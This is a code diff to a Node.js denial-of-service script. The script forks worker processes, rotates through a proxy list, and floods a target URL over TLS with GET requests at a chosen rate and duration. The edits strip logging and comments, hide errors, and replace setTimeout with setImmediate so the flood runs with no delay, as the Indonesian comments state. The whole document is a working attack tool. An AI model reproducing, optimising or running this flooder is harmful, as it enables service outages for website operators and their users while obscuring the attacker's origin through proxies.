@@ -2,7 +2,6 @@ const cluster = require('cluster');
 const fs = require('fs');
 const tls = require('tls');
 const { URL } = require('url');
-const os = require('os');
 
 if (process.argv.length < 7) {
     console.error("Usage: node script.js <url> <time> <rps> <threads> <proxy.txt>");
@@ -26,8 +25,7 @@ if (cluster.isMaster) {
     console.log(`Starting attack on ${targetURL} for ${duration} seconds using ${threads} threads`);
 
     for (let i = 0; i < threads; i++) {
-        const worker = cluster.fork();
-        console.log(`Worker ${worker.process.pid} started`);
+        cluster.fork();
     }
 
     setTimeout(() => {
@@ -35,16 +33,14 @@ if (cluster.isMaster) {
         process.exit(0);
     }, duration * 1000);
 
-    // Log when workers exit
-    cluster.on('exit', (worker, code, signal) => {
-        console.log(`Worker ${worker.process.pid} exited with code ${code}`);
+    cluster.on('exit', (worker) => {
+        console.log(`Worker ${worker.process.pid} exited`);
     });
 } else {
     const target = new URL(targetURL);
     let proxyIndex = 0;
-    const startTime = Date.now(); // Save the start time of the attack
+    const startTime = Date.now();
 
-    // Function to send a single request using TLS connection
     function sendTLSRequest(proxy) {
         const proxyParts = proxy.trim().split(":");
         if (proxyParts.length < 2) return;
@@ -66,7 +62,6 @@ if (cluster.isMaster) {
                     process.exit(0);
                 }
 
-                // Flood request with the given rps
                 for (let i = 0; i < rps; i++) {
                     const request = `GET ${target.pathname} HTTP/1.1\r\n` +
                                     `Host: ${target.hostname}\r\n` +
@@ -76,14 +71,13 @@ if (cluster.isMaster) {
                     client.write(request);
                 }
 
-                // Continue flooding without delay for high-speed request sending
-                setTimeout(flood, 0); // Flooding as quickly as possible within the given rps
+                setImmediate(flood); // Menghapus delay agar request dikirim secepat mungkin
             }
             flood();
         });
 
-        client.on("error", (err) => {
-            console.warn(`Error with proxy ${proxy}: ${err.message}`);
+        client.on("error", () => {
+            client.destroy();
         });
 
         client.on("close", () => {
@@ -91,7 +85,6 @@ if (cluster.isMaster) {
         });
     }
 
-    // Main loop to handle proxy usage and flooding
     function attackLoop() {
         if (Date.now() - startTime >= duration * 1000) {
             console.log(`Worker ${process.pid} stopping attack.`);
@@ -99,16 +92,15 @@ if (cluster.isMaster) {
         }
 
         const proxy = proxies[proxyIndex];
-        proxyIndex = (proxyIndex + 1) % proxies.length; // Round-robin proxy
+        proxyIndex = (proxyIndex + 1) % proxies.length; 
 
         sendTLSRequest(proxy);
-        setTimeout(attackLoop, 0); // Continue flooding without delay
+        setImmediate(attackLoop); // Menghapus delay untuk mengoptimalkan flooding
     }
 
-    // Add uncaught exception handler to prevent worker crashes
     process.on('uncaughtException', (err) => {
         console.error('Uncaught exception:', err);
-        process.exit(1);  // Ensure worker terminates after an uncaught exception
+        process.exit(1);
     });
 
     attackLoop();
